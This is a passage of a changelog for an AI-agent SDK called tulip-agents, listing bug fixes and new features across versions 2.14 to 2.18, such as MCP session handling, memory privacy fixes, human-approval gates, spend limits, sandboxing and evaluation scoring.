    front end can render nested activity instead of a silent gap.
  - *Not a gate bypass.* A `gate_tool`-wrapped tool carries its gate with
    it into any allowlist, a process-global harness policy is consulted
    from inside tool bodies regardless of which loop calls them, and
    per-agent `HookProvider` policies attach to the child via `hooks=`.

  Parallel children compose with plain `asyncio.gather`; children spawned
  by parallel tool calls are already capped by the parent executor's
  `max_concurrency`. The deepagent `task_tool` now rides on this primitive
  instead of its own hand-rolled child loop, so deepagent subagents gain
  the rollup, the cancellation linkage, and the event attribution for free.

## [2.18.0] - 2026-09-29

### Fixed

- **Streamed chat-completions runs report usage again.** With
  `stream_tokens=True` on an OpenAI chat-completions model,
  `TerminateEvent.usage` came back `None` while the identical non-streamed
  run reported full token counts — so `max_cost_usd` never tripped and usage
  accounting read zero. OpenAI only sends the trailing usage chunk on a
  stream when asked via `stream_options={"include_usage": True}`, and
  `stream()` never asked. `stream()` now requests it by default; a
  caller-supplied `stream_options` still reaches the API verbatim, and
  `OpenAIModel(stream_usage=False)` omits it for an OpenAI-compatible server
  that rejects the field. (OpenRouter always sends usage on the last SSE
  chunk and ignores the field, so it was unaffected.)
- **`max_cost_usd` works on DeepSeek V4, directly or through OpenRouter.** The
  price table had no DeepSeek entry, so an `Agent(max_cost_usd=...)` on
  `openrouter:deepseek/deepseek-v4-flash` (or `deepseek:deepseek-v4-flash`)
  was refused at construction ("needs prices"). See Added.
- **A `provider:` prefix no longer hides a model's metadata.** `metadata_for`
  stripped only `openai:` / `anthropic:`, so `"openrouter:deepseek/..."`,
  `"vllm:qwen3.6-35b"` and every other OpenAI-compatible routing prefix
  missed the table, while the same model passed as a built `OpenAIModel`
  (whose `config.model` carries no prefix) found it. Every prefix in
  `tulip.models.providers.COMPATIBLE_PROVIDERS` is now stripped, so a string
  id and the model object resolve to the same entry.
- **Structured-output repair no longer lands in the result state, and is
  metered.** `output_schema` repair appended each `[Schema Repair]` prompt and
  each invalid attempt to the state returned on `AgentResult.state`, so a
  caller that persisted or continued from it carried the repair exchange in
  the conversation; and the repair calls' tokens were never counted. The
  exchange is now kept local to the repair calls, and their usage is added to
  the run's counters (and so to `metrics` and cost).

### Added

- **DeepSeek V4 metadata and prices.** OpenRouter slugs
  `deepseek/deepseek-v4-flash`, `deepseek/deepseek-v4.1-flash`,
  `deepseek/deepseek-v4-pro` (OpenRouter's listed prices, 2026-09-28) and
  DeepSeek's own `deepseek-flash`, `deepseek-v4-flash`, `deepseek-v4-pro`
  (peak rates, so a budget never under-counts). OpenRouter routes to hosts
  whose prices differ; a cap that must never under-count should register
  the ceiling it accepts.
- **`tulip.models.metadata.model_id_of(model)`.** The slug a model object is
  called with (`config.model`, else `model.model`), resolved through
  proxies — a `FallbackChain`, or a caller's per-turn view that forwards
  `__getattr__`. The agent uses it to find a model object's prices and
  context window.
- **Pluggable final-answer verifier.** `Agent(final_answer_verifier=fn)` with
  `async fn(draft: str, ctx: FinalAnswerContext) -> str | None` runs on every
  final answer in auto completion mode — whether or not a tool was called
  (the grounding evaluator only runs after a tool call), on the first pass
  and after an approval `resume()`. `None` accepts; text rejects the draft and
  is fed back to the model for another attempt, up to
  `final_answer_verifier_max_replans` (default 1; 0 = judge only). When they
  run out, the last draft is returned. Each verdict is a
  `FinalAnswerVerificationEvent` (`passed`, `attempt`, `replanning`,
  `feedback`, `error`). A verifier that raises fails open (the draft is
  accepted, `error` is set, a warning is logged). `ctx` carries the run
  identity, the prompt, the messages, the tool executions and the attempt.
  The rejected draft and the feedback are turn-only: the model sees them for
  the rest of the turn; checkpoints, `AgentResult.state` and memory
  extraction never do (`tulip.agent.verification.EPHEMERAL_MESSAGE_KEY`).
  Off by default.
- **`hold_final_answer_tokens`.** With `stream_tokens=True` and a verifier,
  each model call's content chunks are held until the call ends: released at
  once for a tool step or an accepted (or replan-exhausted) answer, dropped
  for a rejected draft — so a streaming UI never shows a draft the verifier
  sent back. Reasoning chunks still stream live. Chunks of a call an
  after-model hook discarded (`retry`) are dropped too. Default off.
- **`AfterModelCallEvent.retry_feedback`.** With `retry = True`, a hook can
  say why: the text is appended (as a user-role note marked automated) to the
  messages of the re-call only — never to the run's state. `retry` alone
  still re-calls blind, as before.
- **Skills a host routes in code.** `SkillsPlugin(skills, active=[...])`
  puts the named skills' instructions in front of every model call (a system
  message after the system prompt, never written to the run state or a
  checkpoint), without the model having to call the `skills` tool. With
  `active` the catalog and the `skills` tool are off by default
  (`catalog=True` keeps them). Unknown names raise.
- **`allowed-tools` can be enforced.** `SkillsPlugin(...,
  enforce_allowed_tools=True)` cancels any tool call outside the union of the
  lists the active skills declare, before the tool runs, and tells the model
  which tools it may use. Skills that declare no list add no tools; with no
  declared list there is no limit. Off by default (advisory, as before).
- **`SkillsPlugin(show_paths=False)`** keeps skill directories out of the
  catalog, activation responses and resource listings — a server's file
  layout is not something the model needs.
- `SkillsPlugin.get_tools()` returns the `skills` tool when the catalog is on,
  so the plugin works the same from `AgentConfig.plugins` as from
  `AgentConfig.skills`.

### Changed

- `metadata_for("<compatible-prefix>:<slug>")` now resolves `<slug>`: e.g.
  `Agent(model="vllm:qwen3.6-35b")` picks up the seeded context window and
  gets the token-counting `LLMCompactor` instead of the message-count
  `SlidingWindowManager`, as `Agent(model=get_model("vllm:qwen3.6-35b"))`
  already did.

## [2.17.0] - 2026-09-28

Hardening for multi-user, multi-turn, human-approval chat
products built on one shared `Agent` instance. The core runtime also ships
without the security-domain tooling, which is now a separate, opt-in
distribution (see Changed).

### Fixed

- **A memory `namespace_resolver` returning `None` no longer pools users
  (privacy).** `LLMMemoryManager(namespace_resolver=...)` treated `None` as
  "use the fixed `namespace_prefix`", so every run the resolver declined — e.g.
  each anonymous visitor — wrote to and recalled from ONE shared namespace,
  leaking one user's memories into another's prompt. `None` now means no
  memory for that run: no recall, no injection, no extraction. See Changed.
- **Per-run MCP headers are never persisted (security).** The documented
  `agent.run(..., metadata={"mcp_headers": {"Authorization": "Bearer …"}})`
  path wrote the bearer token into the run state, so every checkpoint (and
  `AgentResult.state`, the server's pending-interrupt view, hook-visible
  `run.metadata`) carried it. Ephemeral metadata keys — `mcp_headers` and any
  custom `MCPClient.metadata_headers_key` — are now split off at run start and
  carried on the run's in-memory context only: MCP clients (and tools, via
  `ctx.ephemeral_metadata`) still receive them, while state, checkpoints,
  events and hook `run.metadata` never do. A new turn on a checkpoint written
  by an earlier release drops the stale key on its next save. An in-process
  `resume()` reuses the paused run's headers; a cross-process resume passes
  `metadata={"mcp_headers": …}` again.
- **An unreachable MCP server is a typed tool error when a session opens.**
  Opening a per-identity session (or re-opening the default one) to a server
  that is down raised the transport's `httpx.ConnectError`; it now raises
  `MCPConnectionError`, as a connection lost mid-request already did.
- **Closing `Agent.run()` closes the run.** `aclose()` on the generator (or an
  early exit from `contextlib.aclosing(agent.run(...))`) left the inner run
  suspended until garbage collection, so its `finally` — run bookkeeping, the
  final checkpoint — ran late or never. The run is now closed before
  `aclose()` returns; `arun()` and `resume()` close theirs on early exit too.
- **MCP per-identity sessions no longer pile up.** Sessions were keyed by the
  full headers with no idle expiry, so a fresh JWT per turn opened a new
  session every turn and left the old ones open until `max_sessions` evicted
  them. See `session_key` / `session_idle_ttl` under Added; a session reused
  under a key always sends the request's current headers.

- **The long-term memory block is never checkpointed.** A memory manager's
  injected `[Long-term Memory]` block was saved into the thread's checkpoint
  (and the run's result state) with the rest of the messages. It is now
  ephemeral: present for every model call of the turn, stripped before every
  checkpoint save and from `AgentResult.state`, and never passed to the
  extractor. A `resume()` rehydrated from a checkpoint re-injects a fresh block
  for the rest of the turn.
- **Concurrent runs on one Agent no longer share per-run state.** `arun` read
  the final state off the agent after its awaits, so under `asyncio.gather`
  run B returned run A's state and tool executions. Per-run state (final
  state, cancel signal, termination-condition clock, unverified-writes flag,
  hook-emitted events) now lives on a per-run context owned by that run; one
  Agent is safe for concurrent runs on different threads.
- **`resume()` is keyed strictly by `thread_id` (security).** It preferred the
  agent's most recent in-memory interrupt over the thread it was given:
  `resume(thread_id="A")` performed thread B's held booking with B's
  arguments. Paused runs are now held per thread and a resume only ever
  continues the thread it names (from memory, or rehydrated from the
  checkpointer).
- **Resuming before an approval is decided no longer folds the raw
  `__interrupt__` JSON as the tool result.** `resume(..., perform_dangling=True)`
  raises `ApprovalPendingError` instead and leaves the thread paused — nothing
  is folded, yielded or checkpointed.
- **A new message on a checkpointed thread starts a new turn.** The loaded
  state used to be continued verbatim: the iteration counter climbed across
  turns (with `max_iterations=3`, every turn from the third ended
  `max_iterations`), tool-loop detection and `@tool(idempotent=True)` reuse
  spanned turns, a terminal tool in one turn ended the next before the model
  ran, and the first turn's metadata and callable `system_prompt` were frozen
  for the life of the thread. See *Changed* for the exact semantics.
- The approved call performed by `resume(..., perform_dangling=True)` now
  receives a `ToolContext` carrying the run's invocation metadata (it received
  none).
- **Evaluation: a case that checks nothing no longer passes.** An `EvalCase`
  with no expectations and no rubric passed with score 1.0 and zero checks. It
  now fails with the single check `has_expectations: False` (score 0.0). A
  rubric case run through the synchronous `EvalRunner.run()` (which cannot call
  a judge) fails with `rubric:requires_arun` instead of ignoring the rubric.
- **Evaluation: an unreachable judge stops `EvalRunner.arun()`.** It was
  caught and recorded as an ordinary failed case, contradicting
  `LLMJudge.score`'s contract that an unusable judge raises. It now propagates
  as `JudgeUnavailableError` and the cases still in flight are cancelled.
- **Evaluation: a failed case can no longer score 1.0.** A judged score
  replaced the case score even when structural checks failed
  (`passed=False, score=1.0`), inflating `avg_score`. See *Changed* for the
  combination rule.
- **Evaluation: `max_duration_ms` is a real timeout.** It was only compared
  after the run returned, so a hung agent hung the whole suite. The run is now
  cancelled at the budget (`arun`) or abandoned on a daemon thread (`run`,
  since a synchronous call cannot be interrupted) and the case is reported
  `timed_out`. The post-hoc `within_duration_budget` check is kept.
- `check_trajectory` names the steps that are actually missing when a step
  repeats: `(["a", "b"], ["a", "b", "a"])` reported `['a', 'b', 'a'] did not
  follow` instead of `['a']`.

- **An MCP server that is down no longer kills the run.** The transport was
  entered in the run's own task, so a refused connection cancelled the run with
  `CancelledError`, and closing it anywhere else logged "Attempted to exit
  cancel scope in a different task" at shutdown. Each MCP session now runs in a
  task of its own: a server down at attach is logged and skipped and retried on
  a later run (`MCPClient.reconnect_interval`), a server that dies mid-call
  fails that call with `MCPConnectionError` — an ordinary tool error; the run
  continues — and the next call reconnects. A request whose server died while
  streaming its response (which the SDK leaves pending forever) is detected by
  a liveness ping (`liveness_interval`). A genuine cancellation of the run
  still propagates.
- **`CredentialPoolModel` rotates on the streaming path.** `stream()` only
  guarded the call that creates the generator, which never raises, so a 429 on
  the opening request was never rotated. It now rotates on any rotatable error
  before the first chunk and re-raises after it.
- **`AnthropicModel.stream()` sends what `complete()` sends.** It dropped
  `temperature`, prompt caching (system prompt and tool catalog
  `cache_control`) and `response_format`, and its usage lacked the
  `cache_creation_input_tokens` / `cache_read_input_tokens` counters.
- **`FallbackChain` reports which tier served each call.** `last_tier` was
  one attribute shared by every call on the chain, so under concurrency it
  described whichever call finished last, and nothing told a caller which tier
  answered *its* call. See `ServedTier` under Added.
- **One `LLMMemoryManager` can serve every user.** Its namespace was fixed at
  construction, so scoping memories per user meant a manager per user — each
  with its own background-extraction semaphore (no global bound) and its own
  queue that `Agent.drain_memory()` did not drain. See `namespace_resolver`
  under Added.
- **`MCPClient` works on mcp 2.x.** `tulip[mcp]` accepts `mcp>=1.0`, so a
  fresh install resolves mcp 2.x, whose models renamed `isError`,
  `structuredContent`, `inputSchema`, `outputSchema` and `mimeType` to
  snake_case. The client read the camelCase attributes only, so on mcp 2.x a
  server's `isError=True` result reached the model as a success, structured
  content and output schemas were dropped, and every MCP tool was attached
  with an empty parameter schema. Fields are now read under either spelling.
- **The MCP client's real-server tests run in CI again.** The loopback server
  behind `tests/unit/test_mcp_fidelity.py` and
  `test_mcp_secrets_and_sessions.py` imported `mcp.server.fastmcp`, which
  mcp 2.x removed, so once CI's `pip install` resolved mcp 2.x both modules
  skipped — which is how the defect above shipped unnoticed. The server
  now builds on `MCPServer` (mcp 2.x) or `FastMCP` (mcp 1.x); the full-deps CI
  jobs set `TULIP_REQUIRE_MCP_SERVER_TESTS=1` so a missing dependency fails
  instead of skipping; and the 3.13 test job re-runs the MCP client suites
  against mcp 1.x, so both supported majors are exercised against a real
  server.

### Added

- **`MCPClient(session_key=..., session_idle_ttl=...)`.** `session_key(rctx,
  headers)` chooses the per-identity session — e.g. the verified principal of
  a JWT — so rotating tokens for one user share one session (which sends the
  latest token). `session_idle_ttl` (default 300 s, `None` disables) closes
  sessions idle that long, from a background sweep. `max_sessions` now closes
  the least recently used *idle* session first. Opens and closes are logged at
  INFO and counted in `MCPClient.session_stats` (`opened`, `closed`, `live`).
- **`BeforeToolCallEvent.secret_arguments`.** Arguments a hook merges into the
  tool invocation only: the tool receives them, but they never reach
  `state.tool_executions`, checkpoints, messages, events or
  `on_after_tool_call` (and are redacted from the event's `repr`). For a
  confirmation token or credential a hook injects that must not be persisted.

- **Background memory extraction.** `LLMMemoryManager(extract_mode="background")`
  runs extraction as a tracked task after the turn's final event, so a chat no
  longer pays the extractor's latency before its stream closes. Jobs of one
  namespace run in order (two turns of one user never race their writes),
  `max_concurrent_extractions` (default 4) bounds how many run at once,
  failures are logged and emitted as `memory.manager.extract_failed` (never
  raised into a finished run), and `await manager.drain()` /
  `await agent.drain_memory()` flush them at shutdown. `run_sync` drains
  before closing its loop. The default stays `"inline"`.
- `ApprovalPendingError` (`tulip`, `tulip.core`, `tulip.core.errors`), with
  `thread_id`, `interrupt_id`, `question` and the gate's `metadata`.
- `Agent.cancel(thread_id=...)` cancels only the in-flight run(s) on that
  thread; `cancel()` keeps its meaning (cancel everything, or the next run if
  none is running) and now returns how many runs it signalled.
- `Agent.resume(..., metadata=...)` sets the resumed segment's invocation
  metadata; `Agent.pending_interrupts()` lists the threads paused in memory.
- **Run context on hook events.** Every hook event has a read-only
  `event.run` (`tulip.RunInfo`: `run_id`, `thread_id`, read-only `metadata`,
  `agent_name`), so a hook on a shared agent can tell users apart without
  context variables.
- **UI-only side channel from hooks.** `event.emit(CustomEvent(name=..., data=...))`
  on a tool or model hook event yields a `tulip.CustomEvent` from
  `Agent.run()` right after the hook (after the matching `ToolCompleteEvent`
  for `on_after_tool_call`). It never reaches the model, the conversation or
  the checkpoint, and is stamped with the run's `run_id`, `thread_id` and the
  tool call id.
- **`AgentServer`**: `POST /resume {thread_id, response?, decision?,
  perform_dangling=true, metadata?}` continues one paused thread (SSE) —
  `409` with the pending interrupt when the approval is undecided, `404` when
  the caller has no such paused thread. New constructor options:
  `metadata_resolver(request, principal)` supplies trusted metadata that
  overrides client `metadata` on `/invoke`, `/stream` and `/resume`;
  `decision_handler(request, principal, thread_id, decision)` records a
  `/resume` decision (e.g. in an approval store); `stream_tokens=True`.

- **MCP results keep more than their text.** A tool from `MCPClient` now
  returns the server's `structuredContent` on `ToolCompleteEvent.structured_content`
  (the model still reads the text), turns `isError` into the call's error
  (`ToolCompleteEvent.error` is set and the model sees `Error: …`), embeds image
  content as Tulip image segments and passes every non-text block through on
  `ToolCompleteEvent.content_blocks`. `list_tools()` includes `outputSchema`,
  `title` and `annotations`, and `Tool.output_schema` keeps the schema.
  `MCPClient.call_tool_result()` returns all of it as an `MCPToolResult`;
  `call_tool()` still returns the text.
- **Tool progress on the event stream.** `ToolProgressEvent(tool_call_id,
  tool_name, progress, total, message)` arrives live between a call's start and
  completion. MCP `notifications/progress` are surfaced automatically; any tool
  declared `@tool(emits_progress=True)` can send them with
  `tulip.tools.report_progress()`.
- **`ToolOutput`**, a `str` that also carries `structured_content`,
  `content_blocks` and `is_error`, so any tool can return data for the
  application alongside text for the model.
- **One MCP client, many users.** `MCPClient(headers=…)` sends custom headers;
  per-run headers come from run metadata (`agent.run(..., metadata={"mcp_headers":
  {"Authorization": "Bearer <user token>"}})`) or from a `headers_provider`
  called per request with an `MCPRequestContext` (run metadata, tool name, call
  id). Each distinct identity gets its own MCP session (`max_sessions`, LRU), so
  sessions are never shared between users.
- **MCP tool allowlists.** `MCPClient(allowed_tools=[…])` and
  `tool_filter=predicate` decide which tools are listed, attached and callable
  (`MCPToolNotAllowedError` otherwise).
- **`FallbackChain`** (`tulip.models.fallback`): a `ModelProtocol` over an
  ordered list of models. Provider failures (429, 5xx, 529/overloaded, timeouts,
  dropped connections, auth/billing, unknown model) move the call to the next
  tier; request errors (context overflow, a 400 no provider would accept) are
  raised at once. Streaming fails over only before the first chunk and never
  splices two providers into one reply; `first_chunk_timeout` and
  `complete_timeout` bound a slow tier. Each tier has a `CircuitBreaker`
  (failures within a window open it for a cooldown, then one half-open probe).
  Tier switches and breaker transitions go to an `on_event` callback, the
  telemetry bus (`model.fallback`, `model.fallback.breaker`) and
  `FallbackChain.metrics`.
- **`tulip.testing.check_model_conformance(model)`** checks the behaviours the
  agent loop relies on — text, a schema-conformant tool call, a tool-result
  round trip, streamed text and a streamed tool call — so every fallback tier
  can be verified before it takes traffic.
- **`ServedTier` / `served_tier()` (`tulip.models.fallback`).** Each
  `FallbackChain` call reports the tier that served it: `complete()` returns
  the response annotated with `response.metadata["fallback"]`
  (`{"tier", "model", "attempts"}`), and `complete()` and `stream()` publish a
  `ServedTier` to the calling context, read with `served_tier()`.
  `ModelResponse` gains a client-side `metadata` dict (never sent to a model).
- **`LLMMemoryManager(namespace_resolver=...)`.** `(run: RunInfo) -> prefix`
  resolves the namespace per run from its metadata
  (`lambda run: ("users", run.metadata["user_id"])`), so one shared manager
  keeps users apart while `max_concurrent_extractions` bounds all of them and
  one `drain()` flushes all of them. A resolver that raises skips memory for
  that run rather than fall back to a shared namespace. `manager.scoped(prefix)`
  scopes direct `retrieve` / `save` calls the same way; the fixed
  `namespace_prefix` constructor is unchanged.

### Changed

- **Security-domain tooling is a separate distribution, `tulip-agents-security`.**
  The core `tulip-agents` wheel ships the control runtime only. The AI red-team
  probes and job verbs (`red_team` / `assure` / `monitor`, `Target`), the
  inference fingerprinting tools, the scanner, the threat-intel / SIEM / EDR /
  AWS-posture adapters, `SecurityContext`, the SOC analyst factory, the IR
  playbooks, the `SecurityAdapter` contract and its conformance kit moved to
  `packages/tulip-agents-security/` in this repo and import as
  `tulip_security`. Install with `pip install tulip-agents-security`;
  `pip install "tulip-agents[security]"` still works and now installs it (with
  boto3 for the AWS tools). Their notebooks (73-80, 82), the threat scenarios,
  the vendor-integration gists and the playbook YAML moved with them, under
  `packages/tulip-agents-security/examples/`.
- **The grounding and verification layer lives in `tulip.control`.** `Evidence`,
  `Indicator`, `Severity`, the taxonomy enums, `ground_finding` /
  `ground_fingerprint` / `is_finding` / `Abstention`, and `verify` with its
  skeptics now sit next to the admission gate that weighs them, in
  `tulip.control` (modules `admission`, `audit`, `policy`, `governed`,
  `findings`, `grounded`, `taxonomy`, `verification`). The grounding benchmark
  is `python -m tulip.reasoning.grounding_eval`. The lazy top-level names
  (`tulip.Evidence`, `tulip.ground_finding`, …) resolve from `tulip.control`.
- **`tulip.security` is now a compatibility shim** (removal planned for 3.0).
  Every name it exported still imports: the grounding / verification names
  resolve from `tulip.control` and emit `TulipDeprecationWarning`; the domain
  names resolve lazily from `tulip_security` when it is installed and raise an
  `ImportError` naming `pip install tulip-agents-security` when it is not.
  Submodule paths (`tulip.security.policy`, `tulip.security.redteam.probes`, …)
  alias the same module objects, so `mock.patch` targets keep working.
  Migrate with `from tulip.control import Evidence, Severity, ground_finding`
  and `from tulip_security import Target, red_team`.
- `LLMMemoryManager`: a `namespace_resolver` returning `None` now skips memory
  for that run (like a resolver that raises) instead of falling back to
  `namespace_prefix`. To keep the old behaviour, return the prefix explicitly
  (`lambda run: ... or ("tulip_memory",)`). Managers built without a resolver
  are unchanged: they still use the fixed `namespace_prefix`.
- `Agent.run()` and `Agent.resume()` are annotated as
  `AsyncGenerator[TulipEvent, None]` (was `AsyncIterator`), so
  `contextlib.aclosing(agent.run(...))` type-checks without a cast.
- Hook `event.run.metadata` and `ctx.invocation_metadata` no longer contain
  `mcp_headers` (or a client's custom `metadata_headers_key`); read them from
  `ctx.ephemeral_metadata` / `ctx.get_metadata("mcp_headers")` in a tool, or
  from `MCPRequestContext.metadata` in a `headers_provider`.

- A checkpoint written by this release holds no memory block, and one
  written by an earlier release loses its block on the next save. Code that
  read recalled memories back out of `AgentResult.state.messages` must read the
  store (`manager.retrieve()`) instead.
- **New-turn semantics on a checkpointed thread.** Kept: messages and provider
  continuation state. Started afresh per turn: `run_id`, `iteration`,
  `tool_executions`, `reasoning_steps`, `confidence`, `tool_history`, `errors`,
  and the token/cost counters (so `token_budget`, `max_cost_usd` and
  `AgentResult.metrics` are per turn; the checkpoint no longer accumulates
  thread-lifetime token totals — sum per-turn results if you need them).
  The new run's `metadata` is merged over the thread's (new keys win) and the
  leading system message is re-evaluated from `system_prompt`. Resume after an
  interrupt is unchanged: it continues the same turn.
- `AgentState.last_tool_calls` (and so `called_terminal_tool`) only looks at
  the current turn — it stops at the most recent user message.
- `resume()` without `thread_id` raises `RuntimeError` when more than one run
  is paused in memory, instead of resuming the most recent one.
- A new `run()` on a thread discards that thread's in-memory interrupt (the
  new turn's checkpoint is the thread's state from then on).
- `Agent.is_cancelled` reports only a pending cancel-all.
- `AgentServer /stream` streams token deltas as `{"type": "model_chunk", ...}`
  by default (`stream_tokens=False` restores the old stream). Events other than
  `think` / `tool_start` / `tool_complete` / `done` are sent as their
  `model_dump(mode="json")` fields under `type` — an interrupt is a JSON object
  (`question`, `interrupt_id`, `metadata`, …) instead of a Python repr string
  under `data`. `tool_start` / `tool_complete` also carry `tool_call_id`.
- Private: `Agent._interrupt_state` is a read-only view, the
  `_interrupt_prompt` / `_interrupt_thread_id` / `_interrupt_metadata` /
  `_has_unverified_writes` attributes are gone, and `_last_run_state` is no
  longer read by the runtime (with concurrent runs it is whichever finished
  last — use `AgentResult.state`).
- **Evaluation score rule.** A case's `score` is the fraction of its checks
  that passed; a judged case reports `min(judge score, that fraction)` — the
  judge's number when every check passed, never above the fraction otherwise.
  So `passed=False` always implies `score < 1.0`.
- `LLMJudge.score` raises `JudgeUnavailableError` (a `RuntimeError` subclass,
  exported from `tulip.evaluation`) when the model call fails.
- `EvalResult.timed_out` and `EvalReport.timed_out` are new; a timed-out case
  has score 0.0, `within_duration_budget: False`, and shows as `[TIMEOUT]` in
  `EvalReport.summary()`.
- `FallbackChain.last_tier` is deprecated (`TulipDeprecationWarning`): it is
  racy across concurrent calls. Use `response.metadata["fallback"]` or
  `served_tier()`.

## [2.16.0] - 2026-09-16

### Added

- **Computer use on each provider's native tool, gated like any other tool.** (#41)
  `computer_tool(session)` is one `Tool` named `computer` that drives a
  `BrowserSession` page by screenshot, pointer and keyboard. Anthropic sees
  Claude's native `computer_20251124` tool (the beta header is sent for you),
  OpenAI's Responses API sees its native `computer` tool (or
  `computer_use_preview`), and other adapters see an equivalent function schema.
  Each result carries a fresh screenshot. `computer_action` labels a call
  `computer-read` or `computer-write`, and `computer-safety-check` when OpenAI
  flagged it; a flagged call is refused unless `on_safety_check="proceed"`, and
  its checks are acknowledged only when the action ran. The page is checked
  against `allowed_domains` after every action that can navigate.
- **Images in tool results.** `tulip.core.media.encode_image` embeds an image in a
  tool result string, so it survives checkpoints and durable engines unchanged.
  Anthropic and the Responses API receive real image parts, only the three most
  recent image results are sent as images, other adapters see a placeholder,
  and `max_tool_result_length` and the token estimates count text, not base64.
- `Tool.native` holds provider-native tool definitions that an adapter sends in
  place of the function schema.

- **Gemini Live realtime voice.** (#42) `connect_gemini_live(model=..., tools=...)`
  opens a Gemini Live session as a `RealtimeSession`, so the same gated tools,
  `ActionHeld` events and transcripts work on Gemini as on OpenAI's Realtime
  API. `GeminiLiveConnection` translates between the session's events and
  Gemini Live (audio in and out, both transcripts, tool calls and responses,
  turn ends, and the server's go-away notice). Instructions, tools and voice are
  set when the session opens (`gemini_live_config`). Install with
  `pip install "tulip-agents[gemini]"`.

- **Durable agent runs on DBOS.** (#43) `tulip.durable.dbos` runs an agent as a
  DBOS workflow in your own process, with its state in Postgres (or SQLite for
  development). As on Temporal, the agent runs in segments and a held approval
  is a wait of any length: `start_agent_run`, `pending_decision`,
  `signal_decided`. A process that restarts picks up waiting runs, and a segment
  that was cut off halfway is never run again (`InterruptedSegmentError`), since its
  tool calls may already have happened. Install with
  `pip install "tulip-agents[dbos]"`. The engine-neutral segment runner is
  `tulip.durable.segments`.

## [2.15.0] - 2026-09-15

### Added

- **Realtime voice sessions whose tool calls go through the gate.** (#18)
  `tulip.voice.realtime.RealtimeSession` runs a speech-to-speech conversation
  over any socket with `send`/`recv`: it declares the tools, forwards microphone
  audio and text, and yields audio, transcripts, `ToolRan`, `ActionHeld`,
  `ResponseDone` and `SessionError`. A tool the model calls by voice runs the
  same `Tool` as in text, so a held action is not performed: the model is told it
  is pending and the application gets `ActionHeld` with the approval id.
  Unknown tools, malformed arguments and tool failures go back to the model.
  `connect_openai_realtime(...)` opens OpenAI's Realtime API.

- **Browser tools, gated like any other tool.** (#16) `browser_toolset(session)`
  returns `browser_open` and `browser_read` (labels `browser-read`),
  `browser_click` and `browser_type` (`browser-write`), and, with
  `allow_submit=True`, `browser_submit` (`browser-submit`), so a policy can hold a
  form submission for a person. `BrowserSession(allowed_domains=...)` opens only
  `http`/`https` URLs on the listed hosts; a click that navigates elsewhere resets
  the page and fails. Playwright is the new `browser` extra.

- **Durable agent runs on Temporal.** (#15) `tulip.durable.temporal` runs a
  registered agent as a Temporal workflow: the agent works in activity segments
  (the first run, then a resume after each decision) and the workflow waits on a
  `decide` signal between them, for as long as a person takes and across worker
  restarts; a `pending` query shows what it waits on. `create_worker`,
  `start_agent_run` and `signal_decided` wire it up. The agent's checkpointer and
  approval store stay the source of truth. Segments run once, since replaying a
  half-finished segment could repeat tool calls. New `temporal` extra.

- **Spend as a policy input, across runs.** (#28) `Action.cost_usd` says what an
  action spends. `ControlPolicy(require_human_over_usd=...)` needs a person above
  a per-action cost, and `ControlPolicy(spend_limit_usd=...)` denies an action
  that would take its scope's cumulative spend past the limit, which no approval
  overrides. `InMemorySpendLedger` and `FileSpendLedger` keep spend per scope;
  `admit(..., ledger=, spend_scope=)` and `gate_tool(..., ledger=, spend_scope=)`
  read it before deciding and record the cost only after the action ran. A held
  action is weighed against the limit again when its approval is redeemed.

- **Checkpoint history on graphs.** (#30) With a checkpointer and a thread id,
  `StateGraph` now saves a checkpoint after every completed step
  (`GraphConfig(checkpoint_every_step=False)` turns this off); it used to save
  only when a node paused, so a finished run left nothing to inspect.
  `aget_state_history(config)` lists `(checkpoint_id, graph_state)` newest first,
  `aget_state(config, checkpoint_id=...)` reads any of them,
  `aupdate_state(config, values)` writes a new checkpoint through the graph's
  reducers (a paused graph resumes from the edited state), and
  `afork(config, checkpoint_id, new_thread_id=...)` starts a new thread from any
  step without touching the parent.

### Changed

- **Graphs with a checkpointer save a checkpoint after every step.** (#30) A
  `StateGraph` with a checkpointer and a thread id used to save only when a node
  paused; it now also saves after each completed step, so a finished run has a
  history. Pausing and resuming are unchanged. Set
  `GraphConfig(checkpoint_every_step=False)` to keep the old behaviour.

## [2.14.0] - 2026-09-15

### Added

- **A `tulip` command.** (#14) `tulip run AGENT PROMPT --thread ID` streams a run
  and exits 3 when it pauses, printing the approval id; `tulip approvals --store
  FILE list | show | approve | reject --by NAME` decides held calls, checked
  against an `--authority` when given; `tulip resume AGENT --thread ID --answer
  ... --perform` continues and performs the decided call; `tulip audit verify
  FILE --key KEY_ID=PEM --head HASH` checks an export from public keys alone;
  `tulip serve AGENT` runs the HTTP server. `AGENT` is `module:attr` or
  `file.py:attr`, an agent or a function returning one. Standard library only.

- **An approval is bound to its policy and context, and can approve an edited
  call.** (#6) `ControlPolicy(version=...)` and `gate_tool(approval_context=...)`
  (a mapping, or a function of the tool and its arguments: a thread, a tenant, a
  case) are part of the approval id, so a decision made under one policy version
  or in one context is never redeemed in another; with neither set, ids are
  unchanged. `decide(..., arguments={...})` approves the call with edited values
  (same keys): the gate runs the edited call, weighs it against the policy again
  (an edit into a denied action is refused), and records `approval-edited` with
  both argument sets. Approvers in a quorum must approve the same arguments.

- **A spend budget that stops the call that would cross it.** (#11)
  `Agent(max_cost_usd=...)` prices every model call from model metadata and
  stops with `stop_reason="cost_budget"`. It checks *before* each call, against
  that call's worst case (the conversation as input plus `max_tokens` of
  output), so one large turn cannot run past the budget; `token_budget` only
  stops the run after the fact. `AgentResult.metrics.cost_usd` reports the
  spend, `None` when the model is unpriced. A budget on a model with no prices
  raises `ValueError` when the agent is built: register prices with
  `register_metadata`.

- **Read, edit and fork a thread from its checkpoints.** (#12) With a
  checkpointer, `Agent.get_state(thread_id, checkpoint_id=None)` and
  `get_state_history(thread_id, limit=10)` read any saved state, newest first.
  `update_state(thread_id, messages=..., metadata=..., checkpoint_id=...)` writes
  a *new* checkpoint from an old one plus the changes, never rewriting history,
  and the next run continues from it. `fork(thread_id, checkpoint_id, new_thread_id=...)`
  starts a new thread from any checkpoint; running on it leaves the parent
  untouched. Uses only the core checkpointer methods, so it works on every
  backend.

- **A sandbox that is an actual boundary, in the open SDK.** (#13)
  `@tool(sandbox="docker")` (or `TULIP_SANDBOX=docker`, or a `DockerSandbox(...)`
  object) runs each call in a fresh container: no network by default, read-only
  root filesystem, every Linux capability dropped, no privilege escalation, the
  caller's uid/gid, and memory, CPU and process limits. Only `LANG` and what the
  manifest grants reach the environment; a timed-out container is killed.
  Needs the `docker` CLI, no Python dependency. Other providers register by name
  under the `tulip.sandbox_providers` entry-point group; an unknown name raises
  instead of falling back to a weaker box.

- **Who may approve a held call is decided in the SDK.** (#7) Pass
